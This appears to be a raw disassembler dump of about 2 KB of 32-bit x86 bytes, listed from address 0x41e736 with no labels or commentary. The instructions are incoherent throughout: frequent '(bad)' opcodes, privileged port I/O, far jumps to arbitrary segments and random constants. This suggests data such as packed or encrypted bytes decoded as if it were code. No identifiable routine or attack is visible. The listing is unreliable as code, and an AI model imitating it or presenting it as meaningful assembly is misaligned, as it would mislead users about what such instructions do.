  41e736:	push   esi
  41e737:	xchg   edx,eax
  41e738:	mov    edx,0x65f4f57f
  41e73d:	jb     0x41e737
  41e73f:	mov    ah,0x94
  41e741:	mov    ebx,0xf5f69f53
  41e746:	cmp    ecx,DWORD PTR [esi+0x26961be9]
  41e74c:	pop    es
  41e74d:	cmp    al,0xf
  41e74f:	jns    0x41e789
  41e751:	(bad)  
  41e753:	cmp    eax,0xcc43fb67
  41e758:	repz push 0xffffffd4
  41e75b:	mov    ds:0xe3a1ac75,al
  41e760:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e761:	dec    edx
  41e762:	out    0x67,al
  41e764:	push   0x26
  41e766:	and    eax,0xc9be3e50
  41e76b:	add    eax,0x7d4d4b64
  41e770:	dec    ebx
  41e771:	daa    
  41e772:	and    edx,DWORD PTR [ebx+0x52]
  41e775:	clc    
  41e776:	pop    ds
  41e777:	fdivr  DWORD PTR [esi+esi*8-0x1c14dfab]
  41e77e:	or     bh,BYTE PTR [ebx]
  41e780:	clc    
  41e781:	jb     0x41e76c
  41e783:	std    
  41e784:	ins    BYTE PTR es:[edi],dx
  41e785:	xor    bl,bl
  41e787:	mov    edx,0x7a42655
  41e78c:	in     al,dx
  41e78d:	xor    ebp,DWORD PTR [esi-0x56679126]
  41e793:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e794:	adc    BYTE PTR [ebp+0x42],bl
  41e797:	lds    ecx,FWORD PTR [edi+ebp*8-0x7822fed4]
  41e79e:	mov    edi,eax
  41e7a0:	data16 jno 0x41e75f
  41e7a3:	adc    edx,DWORD PTR ds:0x1ded0677
  41e7a9:	iret   
  41e7aa:	test   cl,bh
  41e7ac:	outs   dx,BYTE PTR ds:[esi]
  41e7ad:	in     eax,0x50
  41e7af:	or     eax,0xcaaf5d76
  41e7b4:	iret   
  41e7b5:	retf   0x2294
  41e7b8:	pushf  
  41e7b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e7ba:	dec    eax
  41e7bb:	sti    
  41e7bc:	xchg   DWORD PTR [edx-0x1b7980ca],ebp
  41e7c2:	js     0x41e804
  41e7c4:	xor    ecx,esp
  41e7c6:	pop    ebp
  41e7c7:	shl    DWORD PTR [ebx-0x7c],cl
  41e7ca:	(bad)  
  41e7cb:	dec    edi
  41e7cc:	xchg   ecx,eax
  41e7cd:	xor    ecx,DWORD PTR [edx]
  41e7cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e7d0:	scas   al,BYTE PTR es:[edi]
  41e7d1:	jns    0x41e7c7
  41e7d3:	mov    al,gs:0xf324d498
  41e7d9:	mov    esp,0xc6a36b38
  41e7de:	gs (bad) 
  41e7e0:	aam    0x14
  41e7e2:	pop    es
  41e7e3:	or     DWORD PTR [esi-0x6b0cc4aa],ebx
  41e7e9:	mov    esp,DWORD PTR [esi]
  41e7eb:	in     al,0x97
  41e7ed:	jmp    0xb6ea:0xd88860cd
  41e7f4:	mov    eax,ds:0xf4755312
  41e7f9:	aad    0x27
  41e7fb:	sub    edx,DWORD PTR [esp+ecx*4]
  41e7fe:	dec    edx
  41e7ff:	xor    ebp,edx
  41e801:	(bad)  
  41e802:	mov    ds:0xa9cd6997,al
  41e807:	aam    0xd4
  41e809:	scas   al,BYTE PTR es:[edi]
  41e80a:	into   
  41e80b:	je     0x41e88a
  41e80d:	cwde   
  41e80e:	jmp    0x41e8a7
	...
  41e873:	add    BYTE PTR ds:0x9e5c8a39,ch
  41e879:	(bad)  
  41e87a:	(bad)  
  41e87b:	jns    0x41e8ec
  41e87d:	xor    al,0xcc
  41e87f:	jg     0x41e831
  41e881:	mov    BYTE PTR [edi+0x42],0xa0
  41e885:	inc    esp
  41e886:	add    DWORD PTR [eax],eax
  41e888:	add    al,0x1
  41e88a:	add    BYTE PTR [eax],al
  41e88c:	sar    DWORD PTR [eax+0x78],0xef
  41e890:	jne    0x41e84f
  41e892:	test   eax,0xda09b231
  41e897:	mov    eax,0x959e09db
  41e89c:	mov    esp,DWORD PTR [ebx]
  41e89e:	punpcklbw mm2,mm7
  41e8a1:	inc    ebp
  41e8a2:	enter  0x8bff,0x73
  41e8a6:	(bad)  
  41e8a7:	aam    0x75
  41e8a9:	mov    ch,0x45
  41e8ab:	sub    DWORD PTR [ebp-0xf],esp
  41e8ae:	inc    edi
  41e8af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e8b0:	push   edx
  41e8b1:	jle    0x41e87f
  41e8b3:	add    DWORD PTR [edi-0x25],esi
  41e8b6:	sbb    eax,0xe02e1510
  41e8bb:	push   ds
  41e8bc:	add    edx,DWORD PTR [ecx+0x6d4cadfc]
  41e8c2:	sbb    bl,al
  41e8c4:	jo     0x41e8cd
  41e8c6:	dec    esi
  41e8c7:	(bad)  
  41e8c8:	or     eax,0xf1ad7cd5
  41e8cd:	stc    
  41e8ce:	int    0x78
  41e8d0:	arpl   WORD PTR [ecx+ebp*4+0x2a],dx
  41e8d4:	daa    
  41e8d5:	push   esi
  41e8d6:	mov    ah,0xe0
  41e8d8:	mov    ds,WORD PTR [edi-0x75]
  41e8db:	fstp   DWORD PTR [ebp+0x2b]
  41e8de:	mov    esp,DWORD PTR [edi+0x26]
  41e8e1:	out    0xe,al
  41e8e3:	mov    eax,ds:0xea31fb95
  41e8e8:	and    DWORD PTR [edx+0x7c8e05c9],ebp
  41e8ee:	add    DWORD PTR [ebx],ebx
  41e8f0:	push   ecx
  41e8f1:	rol    esp,0xec
  41e8f4:	daa    
  41e8f5:	stos   DWORD PTR es:[edi],eax
  41e8f6:	imul   esp,ebp,0xffffffde
  41e8f9:	mov    cs,ebp
  41e8fb:	imul   ecx,DWORD PTR [eax+0x523e834e],0xf344d389
  41e905:	loope  0x41e88b
  41e907:	in     eax,0x4b
  41e909:	ficom  WORD PTR [edx]
  41e90b:	lds    edi,FWORD PTR [ebx+eax*8-0x13]
  41e90f:	sub    DWORD PTR [ebx+ebp*2],ecx
  41e912:	shl    DWORD PTR [esi-0x1f132405],cl
  41e918:	or     BYTE PTR [bx+si-0x1003],dh
  41e91d:	jle    0x41e927
  41e91f:	mov    cl,0x83
  41e921:	mul    BYTE PTR [edx+0x5903d775]
  41e927:	adc    BYTE PTR [edi+0x1aba0060],ch
  41e92d:	int    0x50
  41e92f:	push   0x13a9f53e
  41e934:	idiv   BYTE PTR [edi-0x1d40ce55]
  41e93a:	js     0x41e8c9
  41e93c:	add    cl,BYTE PTR [edx+0x3a57f1ed]
  41e942:	and    DWORD PTR [ebx],0xad2ed180
  41e948:	xchg   esp,esi
  41e94a:	packsswb mm4,QWORD PTR [ebx]
  41e94d:	imul   edi,DWORD PTR [eax],0xda56c74e
  41e953:	(bad)  
  41e954:	js     0x41e9d5
  41e956:	jne    0x41e8df
  41e958:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e959:	call   0x9dc3c776
  41e95e:	xchg   edx,eax
  41e95f:	jmp    0x3d2250b4
  41e964:	ret    0xb1e6
  41e967:	dec    edx
  41e968:	jmp    0x41e95d
  41e96a:	or     eax,0x3d57fc97
  41e96f:	aas    
  41e970:	cdq    
  41e971:	adc    al,0xf5
  41e973:	jmp    DWORD PTR [edi]
  41e975:	ds sbb esi,edi
  41e978:	xchg   ebx,eax
  41e979:	fs loopne 0x41e913
  41e97c:	dec    eax
  41e97d:	fmul   QWORD PTR [ebx-0x6a8c4e6d]
  41e983:	cld    
  41e984:	cmp    dh,BYTE PTR [edx-0x7d]
  41e987:	sub    ebp,DWORD PTR [edx-0x70aac507]
  41e98d:	fsub   DWORD PTR [esp+eiz*4+0x0]
	...
  41e9f1:	add    BYTE PTR [eax],al
  41e9f3:	add    BYTE PTR [eax-0x3],bh
  41e9f6:	ret    0xc766
  41e9f9:	jg     0x41e9f7
  41e9fb:	dec    DWORD PTR [edi+0x67]
  41e9fe:	rol    dl,1
  41ea00:	in     al,0x1c
  41ea02:	ror    esi,cl
  41ea04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea05:	inc    ebp
  41ea06:	add    DWORD PTR [eax],eax
  41ea08:	add    al,0x1
  41ea0a:	add    BYTE PTR [eax],al
  41ea0c:	unpcklps xmm3,xmm7
  41ea0f:	(bad)  
  41ea10:	cld    
  41ea11:	mov    ebp,DWORD PTR [ebx]
  41ea13:	add    eax,0x50a504ea
  41ea18:	imul   ecx,DWORD PTR [edx+0x6e],0xe632126f
  41ea1f:	push   cs
  41ea20:	call   0x1205:0x4e14b781
  41ea27:	out    dx,eax
  41ea28:	adc    dh,BYTE PTR [ebx]
  41ea2a:	into   
  41ea2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea2c:	jmp    0x8326:0xa2d15e5a
  41ea33:	sbb    ecx,edx
  41ea35:	pop    edx
  41ea36:	sbb    dl,al
  41ea38:	pop    ecx
  41ea39:	mov    DWORD PTR [ecx-0x6c],0x318fcad2
  41ea40:	mov    esi,0x8a594bec
  41ea45:	in     eax,0x1d
  41ea47:	mov    bh,0xa
  41ea49:	sub    BYTE PTR [edx],ah
  41ea4b:	jle    0x41eab3
  41ea4d:	cdq    
  41ea4e:	push   edi
  41ea4f:	mov    fs:0x2d63a732,eax
  41ea55:	(bad)
  41ea59:	mov    edi,0xd5d73b31
  41ea5e:	arpl   WORD PTR [esi-0x68],ax
  41ea61:	and    DWORD PTR ds:0xe0371731,ebp
  41ea67:	jl     0x41ea3b
  41ea69:	arpl   cx,si
  41ea6b:	rcl    DWORD PTR [ebp+0x69202bee],0xd
  41ea72:	std    
  41ea73:	das    
  41ea74:	loope  0x41ea56
  41ea76:	sbb    al,0xfc
  41ea78:	outs   dx,DWORD PTR ds:[esi]
  41ea79:	test   eax,0x87b3a747
  41ea7e:	aas    
  41ea7f:	mul    ah
  41ea81:	adc    BYTE PTR [eax],al
  41ea83:	jo     0x41ea8d
  41ea85:	cmp    al,0x51
  41ea87:	jmp    0x41eac1
  41ea89:	stos   DWORD PTR es:[edi],eax
  41ea8a:	dec    edx
  41ea8b:	ror    edx,cl
  41ea8d:	mov    eax,0x8d2bc9a0
  41ea92:	rcr    DWORD PTR [edx-0x613a411],cl
  41ea98:	mov    WORD PTR [ebp+0x787be2b],ss
  41ea9e:	push   cs
  41ea9f:	pusha  
  41eaa0:	jnp    0x41ea3a
  41eaa2:	sbb    BYTE PTR [edi-0x2bdece24],bh
  41eaa8:	sbb    eax,0xe407ce1b
  41eaad:	dec    edi
  41eaae:	aas    
  41eaaf:	std    
  41eab0:	sbb    al,ch
  41eab2:	aas    
  41eab3:	mov    esi,0xf8f6851a
  41eab8:	jle    0x41ea42
  41eaba:	pop    ebx
  41eabb:	and    bh,BYTE PTR [bx+si-0x1c]
  41eabf:	loope  0x41eb22
  41eac1:	aad    0x91
  41eac3:	push   0x584cb0ce
  41eac8:	(bad)  
  41eac9:	leave  
  41eaca:	cmp    dl,BYTE PTR [edi]
  41eacc:	sar    BYTE PTR [ecx],0x71
  41eacf:	xchg   esp,eax
  41ead0:	loope  0x41eb36
  41ead2:	dec    eax
  41ead3:	and    al,0x63
  41ead5:	mov    al,BYTE PTR [edi*2+0x36244071]
  41eadc:	repnz loopne 0x41eaf1
  41eadf:	and    DWORD PTR [eax],eax
  41eae1:	stos   DWORD PTR es:[edi],eax
  41eae2:	sahf   
  41eae3:	sbb    ch,dh
  41eae5:	sbb    eax,DWORD PTR es:[edi]
  41eae8:	sub    DWORD PTR [ecx+edi*4],eax
  41eaeb:	xchg   ebx,eax
  41eaec:	jecxz  0x41eaf4
  41eaee:	sub    eax,0x34ee48d5
  41eaf3:	dec    ecx
  41eaf4:	mov    BYTE PTR [eax],al
  41eaf6:	out    dx,eax
  41eaf7:	jmp    0xd3197187
  41eafc:	imul   eax,DWORD PTR ds:0x439ac31a,0x36
  41eb03:	outs   dx,BYTE PTR ds:[esi]
  41eb04:	jge    0x41eaf2
  41eb06:	cli    
  41eb07:	pop    ss
  41eb08:	inc    esp
  41eb09:	pop    es
  41eb0a:	adc    al,0x17
  41eb0c:	push   ebx
  41eb0d:	dec    esp
  41eb0e:	or     DWORD PTR es:[eax],eax
	...
  41eb71:	add    BYTE PTR [eax],al
  41eb73:	add    BYTE PTR [edx],dl
  41eb75:	das    
  41eb76:	mov    esi,DWORD PTR [edi+edi*4+0xaaf3fb4]
  41eb7d:	out    0x9b,al
  41eb7f:	aad    0xd3
  41eb81:	or     DWORD PTR [edi],ebx
  41eb83:	and    BYTE PTR [eax+0x4000146],ch
  41eb89:	add    DWORD PTR [eax],eax
  41eb8b:	add    BYTE PTR [eax+ebx*2],ah
  41eb8e:	ror    DWORD PTR ds:0x9ffc0008,1
  41eb94:	mov    eax,ds:0x9f5660bf
  41eb99:	outs   dx,DWORD PTR ds:[esi]
  41eb9a:	mov    ds:0x231eb0e8,al
  41eb9f:	sbb    al,0x32
  41eba1:	inc    esi
  41eba2:	leave  
  41eba3:	clc    
  41eba4:	arpl   WORD PTR [bx+di+0x50],sp
  41eba8:	mov    ebx,0xc822fecb
  41ebad:	cmp    BYTE PTR [eax],ah
  41ebaf:	push   es
  41ebb0:	inc    esp
  41ebb1:	cmp    esi,esp
  41ebb3:	xchg   esi,eax
  41ebb4:	mov    ebx,0x86587b91
  41ebb9:	xchg   esp,eax
  41ebba:	adc    eax,0xd6841143
  41ebbf:	(bad)  
  41ebc0:	(bad)
  41ebc3:	and    al,0x5c
  41ebc5:	ds ja  0x41eb73
  41ebc8:	or     bh,BYTE PTR [ecx-0x5b]
  41ebcb:	test   al,0x8e
  41ebcd:	jge    0x41ebb9
  41ebcf:	and    DWORD PTR [ecx+0x39a2e88d],esp
  41ebd5:	leave  
  41ebd6:	and    eax,0x7ecc8da4
  41ebdb:	adc    DWORD PTR [edx+0x16],ebx
  41ebde:	mov    edx,0x3d6a20c6
  41ebe3:	jecxz  0x41ec29
  41ebe5:	xchg   ebx,eax
  41ebe6:	mov    eax,0x12286b45
  41ebeb:	lahf   
  41ebec:	lods   eax,DWORD PTR ds:[esi]
  41ebed:	pop    edx
  41ebee:	addr16 jge 0x41ec52
  41ebf1:	rcl    BYTE PTR [ecx+0x6c],cl
  41ebf4:	pop    edi
  41ebf5:	je     0x41ec37
  41ebf7:	mov    eax,0x3e83b376
  41ebfc:	or     DWORD PTR [edx-0x5],edx
  41ebff:	lea    eax,[edx-0x18c6ba73]
  41ec05:	pop    ebp
  41ec06:	test   eax,0x5aa99a02
  41ec0b:	rcl    BYTE PTR [ebx+0xf],0x8d
  41ec0f:	or     esp,DWORD PTR [eax]
  41ec11:	lods   eax,DWORD PTR ds:[esi]
  41ec12:	cmp    al,0x4d
  41ec14:	cdq    
  41ec15:	adc    al,dh
  41ec17:	loope  0x41ec52
  41ec19:	icebp  
  41ec1a:	sbb    BYTE PTR [edi+0x43],bl
  41ec1d:	mul    BYTE PTR [edx-0x49]
  41ec20:	add    eax,0x23a88c9
  41ec25:	adc    esi,DWORD PTR [ebp-0x5]
  41ec28:	icebp  
  41ec29:	jbe    0x41ec89
  41ec2b:	aaa    
  41ec2c:	paddw  mm1,QWORD PTR [edi]
  41ec2f:	fnstsw WORD PTR [edi]
  41ec31:	mov    WORD PTR [edi],?
  41ec33:	outs   dx,DWORD PTR ds:[esi]
  41ec34:	dec    eax
  41ec35:	rol    ebx,cl
  41ec37:	fprem  
  41ec39:	xor    BYTE PTR [edx+0x4bacb027],ah
  41ec3f:	and    DWORD PTR [eax],ebp
  41ec41:	dec    esi
  41ec42:	popf   
  41ec43:	fsubr  DWORD PTR [esi]
  41ec45:	mul    ah
  41ec47:	and    edi,DWORD PTR [esi+0x42]
  41ec4a:	add    ebx,DWORD PTR [eax-0x219875c3]
  41ec50:	xlat   BYTE PTR ds:[ebx]
  41ec51:	std    
  41ec52:	xor    ecx,ebp
  41ec54:	push   ebp
  41ec55:	out    dx,eax
  41ec56:	ror    DWORD PTR [ebx-0x23cac9fe],0x55
  41ec5d:	out    dx,eax
  41ec5e:	aas    
  41ec5f:	pop    esp
  41ec60:	je     0x41ec6a
  41ec62:	mov    ebp,0x72b05751
  41ec67:	sbb    al,0x6a
  41ec69:	dec    edx
  41ec6a:	xor    DWORD PTR ss:[ecx+esi*1+0x3db83c85],edi
  41ec72:	mov    ebx,0x12b963f8
  41ec77:	aas    
  41ec78:	cmp    BYTE PTR [eax],ah
  41ec7a:	outs   dx,BYTE PTR ds:[esi]
  41ec7b:	call   0x1c55ed72
  41ec80:	push   edx
  41ec81:	mov    dl,BYTE PTR [ecx-0x34]
  41ec84:	iret   
  41ec85:	loopne 0x41ec3f
  41ec87:	int3   
  41ec88:	mov    esi,0x40930676
  41ec8d:	or     al,dh
  41ec8f:	jb     0x41ec91
	...
  41ecf1:	add    BYTE PTR [eax],al
  41ecf3:	add    BYTE PTR [ecx-0xf],al
  41ecf6:	(bad)
  41ecf9:	hlt    
  41ecfa:	gs icebp 
  41ecfc:	dec    edi
  41ecfd:	adc    eax,0x1a965fd0
  41ed02:	cli    
  41ed03:	add    ch,BYTE PTR [edi+eax*2+0x1040001]
  41ed0a:	add    BYTE PTR [eax],al
  41ed0c:	push   ds
  41ed0d:	adc    edi,DWORD PTR [ecx+ecx*1]
  41ed10:	pop    edi
  41ed11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed12:	push   ebp
  41ed13:	hlt    
  41ed14:	test   DWORD PTR [ebx],0x385e2130
  41ed1a:	ror    DWORD PTR [edx-0x4b],0x63
  41ed1e:	stos   DWORD PTR es:[edi],eax
  41ed1f:	ja     0x41ecd0
  41ed21:	mov    eax,ds:0xdd1b604e
  41ed26:	gs dec eax
  41ed28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed29:	adc    BYTE PTR [esi+0x1dab8d98],cl
  41ed2f:	lods   eax,DWORD PTR ds:[esi]
  41ed30:	sbb    bh,0xce
  41ed33:	imul   ecx,DWORD PTR [ecx-0x5d0cccf9],0x1b
  41ed3a:	mov    cl,0x16
  41ed3c:	cld    
  41ed3d:	loopne 0x41ed7e
  41ed3f:	scas   eax,DWORD PTR es:[edi]
  41ed40:	xchg   ebp,eax
  41ed41:	mov    al,ds:0x29c35500
  41ed46:	cmp    eax,DWORD PTR [eax-0x4b]
  41ed49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ed4a:	pop    ebx
  41ed4b:	xor    eax,DWORD PTR [ebx+0x7e]
  41ed4e:	fld    DWORD PTR [ecx+ebx*2+0x47]
  41ed52:	sub    DWORD PTR [ebx-0xd],ebx
  41ed55:	cmp    ecx,0x7308b02e
  41ed5b:	jae    0x41edc4
  41ed5d:	retf   
  41ed5e:	js     0x41ed35
  41ed60:	mov    ebp,0xe97d5584
  41ed65:	mov    ecx,0x31527e3e
  41ed6a:	and    ch,0x37
  41ed6d:	rcr    DWORD PTR [ebp+0x6f],1
  41ed70:	aad    0x49
  41ed72:	mov    ch,0x7f
  41ed74:	lea    ebp,[esi+0x1b]
  41ed77:	daa    
  41ed78:	cld    
  41ed79:	clc    
  41ed7a:	enter  0xafa0,0xac
  41ed7e:	inc    BYTE PTR [ebx-0x6fca8c21]
  41ed84:	and    DWORD PTR ds:[esi-0x69],ecx
  41ed88:	fld    TBYTE PTR [esi-0x7e]
  41ed8b:	inc    ecx
  41ed8c:	ds js  0x41ed5b
  41ed8f:	push   edi
  41ed90:	cdq    
  41ed91:	loope  0x41edfa
  41ed93:	push   0xffffffa5
  41ed95:	mov    dh,ch
  41ed97:	mov    ecx,esi
  41ed99:	nop
  41ed9a:	pop    edx
  41ed9b:	sub    al,0x7f
  41ed9d:	dec    ebx
  41ed9e:	out    dx,eax
  41ed9f:	lods   al,BYTE PTR ds:[esi]
  41eda0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eda1:	xchg   edi,ebp
  41eda3:	mov    DWORD PTR ds:0x52783e57,ebp
  41eda9:	push   ebx
  41edaa:	sbb    DWORD PTR fs:[eax+edi*2+0xd476751],ebx
  41edb2:	mov    ebx,0x8e784564
  41edb7:	fld    DWORD PTR [edi+ebx*1-0x6f9b1350]
  41edbe:	mov    WORD PTR [eax-0x37],fs
  41edc1:	xor    BYTE PTR [eax],ch
  41edc3:	mov    ebp,0xcfb18c61
  41edc8:	xchg   ebx,eax
  41edc9:	jle    0x41ee2f
  41edcb:	dec    esi
  41edcc:	push   ebp
  41edcd:	scas   al,BYTE PTR es:[edi]
  41edce:	ret    0xc7db
  41edd1:	shr    DWORD PTR [edi],1
  41edd3:	mov    ecx,0xcf8f8fc3
  41edd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41edd9:	xlat   BYTE PTR ds:[ebx]
  41edda:	mov    bh,dh
  41eddc:	mov    ebp,0x2ba69057
  41ede1:	sbb    al,0x85
  41ede3:	add    eax,DWORD PTR [ebp-0x632933f8]
  41ede9:	aad    0x8f
  41edeb:	outs   dx,BYTE PTR ds:[esi]
  41edec:	mov    eax,ds:0x7ebbeeef
  41edf1:	loop   0x41edf6
  41edf3:	pop    edi
  41edf4:	idiv   BYTE PTR [edi]
  41edf6:	nop
  41edf7:	lahf   
  41edf8:	pusha  
  41edf9:	les    ebx,FWORD PTR [ebx]
  41edfb:	pop    esi
  41edfc:	(bad)  
  41edfd:	xchg   BYTE PTR [ebp+edx*2-0x7d],ah
  41ee01:	or     DWORD PTR ds:0x17b6a271,ebx
  41ee07:	sahf   
  41ee08:	xchg   edx,eax
  41ee09:	aam    0xfa
  41ee0b:	pop    esi
  41ee0c:	sub    dl,dl
  41ee0e:	ds cdq 
	...
  41ee74:	add    eax,0x7b197956
  41ee79:	aas    
  41ee7a:	gs pop esi
  41ee7c:	pop    edx
  41ee7d:	repnz call 0xb0ed:0xfbb3c3e7
  41ee85:	dec    eax
  41ee86:	add    DWORD PTR [eax],eax
  41ee88:	add    al,0x1
  41ee8a:	add    BYTE PTR [eax],al
  41ee8c:	das    
  41ee8d:	outs   dx,BYTE PTR ds:[esi]
  41ee8e:	ficomp WORD PTR [ebx]
  41ee90:	sub    ebx,ebp
  41ee92:	dec    esp
  41ee93:	jg     0x41ef06
  41ee95:	pop    ebp
  41ee96:	test   al,0x72
  41ee98:	in     al,0x72
  41ee9a:	scas   eax,DWORD PTR es:[edi]
  41ee9b:	clc    
  41ee9c:	outs   dx,DWORD PTR ds:[esi]
  41ee9d:	cmp    dh,bl
  41ee9f:	jns    0x41ee92
  41eea1:	es jle 0x41eed8
  41eea4:	ds xchg ebx,eax
  41eea6:	sbb    eax,0x49faf378
  41eeab:	rcl    BYTE PTR [eax],1
  41eead:	scas   al,BYTE PTR es:[edi]
  41eeae:	test   BYTE PTR [edi],al
  41eeb0:	mov    edi,0x51acd9b2
  41eeb5:	mov    ah,0xb3
  41eeb7:	js     0x41ee5d
  41eeb9:	mov    edx,0x83d90805
  41eebe:	in     al,0x4c
  41eec0:	ins    BYTE PTR es:[edi],dx
  41eec1:	in     al,dx
  41eec2:	bound  esi,QWORD PTR [eax-0x6694702c]
  41eec8:	and    BYTE PTR [ebx],al
  41eeca:	fwait
  41eecb:	adc    bh,BYTE PTR [ebx+0x20]
  41eece:	int    0x79
  41eed0:	imul   ebx,DWORD PTR [esi],0xca053f91
  41eed6:	xchg   ch,bh
  41eed8:	mul    DWORD PTR [ecx]
  41eeda:	mov    eax,0xa031e62d
  41eedf:	cdq    
  41eee0:	push   esp
  41eee1:	fimul  WORD PTR [esi-0x2ded3143]
  41eee7:	lods   eax,DWORD PTR ds:[esi]
  41eee8:	push   ds
  41eee9:	sub    eax,0xb51f3ec9
  41eeee:	sti    
  41eeef:	mov    ds:0x5040643a,eax
  41eef4:	sbb    eax,ebx
  41eef6:	push   cs
  41eef7:	push   ebx
  41eef8:	xchg   esi,eax
  41eef9:	xchg   edi,eax
  41eefa:	arpl   WORD PTR [ebp+0x50],si
  41eefd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eefe:	mov    bl,0x38
  41ef01:	test   eax,0x78607063
  41ef06:	dec    edx
  41ef07:	nop
  41ef08:	push   ebp
  41ef09:	xchg   DWORD PTR [eax+0x24],esp
  41ef0c:	mov    BYTE PTR [edx+0x13e5d4b],cl
  41ef12:	mov    edx,0xc707e9f1
  41ef17:	dec    BYTE PTR [esi+0x7d]
  41ef1a:	push   ds
  41ef1b:	dec    ebx
  41ef1c:	retf   0xcf36
  41ef1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef20:	stc    
  41ef21:	dec    esi
  41ef22:	stc    
  41ef23:	es inc edi
  41ef25:	mov    ch,0xcd
  41ef27:	sbb    eax,0x9c7cbccf
  41ef2c:	jl     0x41ef2c
  41ef2e:	iret   
  41ef2f:	sbb    cl,BYTE PTR [eax-0x44]
  41ef32:	mov    bl,0x5c
  41ef34:	bswap  ebx
  41ef36:	xlat   BYTE PTR gs:[ebx]
  41ef38:	jno    0x41eec0
  41ef3a:	bound  esp,QWORD PTR [ebp+0x6]
  41ef3d:	jmp    0x49c3:0xc908a19e
  41ef44:	add    eax,0x2db63df9
  41ef49:	rcl    DWORD PTR [edi],1
  41ef4b:	sbb    eax,0xc1f32e40
  41ef50:	fstp   DWORD PTR [esi+ecx*2]
  41ef53:	cmp    DWORD PTR [ecx],ebp
  41ef55:	repnz dec ebp
  41ef57:	repz les ecx,FWORD PTR ss:[ecx+0x28]
  41ef5c:	cdq    
  41ef5d:	mov    ebx,0x668ece29
  41ef62:	(bad)  
  41ef63:	ja     0x41eefd
  41ef65:	(bad)  
  41ef67:	inc    edi
  41ef68:	scas   al,BYTE PTR es:[edi]
  41ef69:	dec    ebp
  41ef6a:	and    BYTE PTR [ecx],ch
  41ef6c:	es (bad) 
  41ef6e:	push   ecx
  41ef6f:	sub    eax,0x9c73dbf
  41ef74:	xor    eax,0x87bc78df
  41ef79:	lds    edi,FWORD PTR [edx+0x3c]
  41ef7c:	adc    DWORD PTR [edx+0x6f7fe58],esi
  41ef82:	iret   
  41ef83:	dec    edi
  41ef84:	call   0xc90e:0x5f79455c
  41ef8b:	adc    edi,0x1
  41ef8e:	and    ch,BYTE PTR [edx+0x0]
	...
  41eff1:	add    BYTE PTR [eax],al
  41eff3:	add    BYTE PTR [ecx-0xda40a3],bh
  41eff9:	out    0xbb,eax
  41effb:	fisttp QWORD PTR [ecx+0x0]
  41effe:	lock imul ebp,DWORD PTR [edx],0x60
  41f002:	data16 das 
  41f004:	mov    ah,0x49
  41f006:	add    DWORD PTR [eax],eax
  41f008:	add    al,0x1
  41f00a:	add    BYTE PTR [eax],al
  41f00c:	inc    ebx
  41f00d:	dec    ecx
  41f00e:	popa   
  41f00f:	retf   0xb611
  41f012:	popa   
  41f013:	sti    
  41f014:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f015:	xchg   edi,eax
  41f016:	mov    eax,0xd0c794d3
  41f01b:	pop    ebx
  41f01c:	outs   dx,BYTE PTR ds:[esi]
  41f01d:	dec    eax
  41f01e:	test   BYTE PTR [esi+0x596c943e],bl
  41f024:	test   DWORD PTR [eax],ecx
  41f026:	cmp    al,0x6
  41f028:	pop    esi
  41f029:	ror    bh,cl
  41f02b:	jmp    0x41efc0
  41f02d:	xchg   ebx,eax
  41f02e:	je     0x41f059
  41f030:	call   DWORD PTR [ecx-0x16d3de4]
  41f036:	mov    esp,esi
  41f038:	out    dx,eax
  41f039:	std    
  41f03a:	xlat   BYTE PTR ds:[ebx]
  41f03b:	addr16 xor ebp,ebp
  41f03e:	lahf   
  41f03f:	not    BYTE PTR [edi+0x21]
  41f042:	test   al,0x6b
  41f044:	xor    ecx,DWORD PTR [esi+0x19b702db]
  41f04a:	jmp    0x41f02f
  41f04c:	in     eax,dx
  41f04d:	xor    cl,BYTE PTR [ecx]
  41f04f:	add    eax,DWORD PTR [edx-0x18578d5c]
  41f055:	dec    esi
  41f056:	jecxz  0x41f037
  41f058:	ffree  st(5)
  41f05a:	jno    0x41f02b
  41f05c:	cli    
  41f05d:	add    eax,0xbe110b58
  41f062:	xchg   eax,edi
  41f064:	test   ebx,eax
  41f066:	xchg   DWORD PTR fs:[edx+0x69],esi
  41f06a:	aad    0xf0
  41f06c:	push   ebp
  41f06d:	push   cs
  41f06e:	imul   edi,DWORD PTR [ebp-0x50c0803b],0xae6d76a
  41f078:	fisub  WORD PTR [ebx+eax*8]
  41f07b:	mov    ah,BYTE PTR [eax+0x22]
  41f07e:	pop    ebx
  41f07f:	add    DWORD PTR [ecx],ebx
  41f081:	xchg   esi,eax
  41f082:	stos   BYTE PTR es:[edi],al
  41f083:	and    eax,0x53ebc5db
  41f088:	dec    ebx
  41f089:	fldenv [esi]
  41f08b:	pop    ds
  41f08c:	push   edi
  41f08e:	mov    esi,0xc5035f4b
  41f093:	(bad)
  41f097:	repnz in eax,0xc5
  41f09a:	xlat   BYTE PTR ds:[ebx]
  41f09b:	div    DWORD PTR [edx+ebx*4+0x11]
  41f09f:	inc    eax
  41f0a0:	and    ah,cl
  41f0a2:	jne    0x41f0f3
  41f0a4:	fild   QWORD PTR [ebx-0x8f6191c]
  41f0aa:	fxch   st(0)
  41f0ac:	sbb    DWORD PTR [eax-0x6a],edi
  41f0af:	inc    ebp
  41f0b0:	out    dx,al
  41f0b1:	dec    esi
  41f0b2:	and    BYTE PTR [esi-0x34],dh
  41f0b5:	les    edx,FWORD PTR [edi-0x58093b7e]
  41f0bb:	xchg   sp,ax
  41f0bd:	pop    edx
  41f0be:	push   ss
  41f0bf:	cs jae 0x41f095
  41f0c2:	mov    dl,0xf4
  41f0c4:	jbe    0x41f04c
  41f0c6:	fs inc ebp
  41f0c8:	imul   esp,DWORD PTR [ecx],0xffffff93
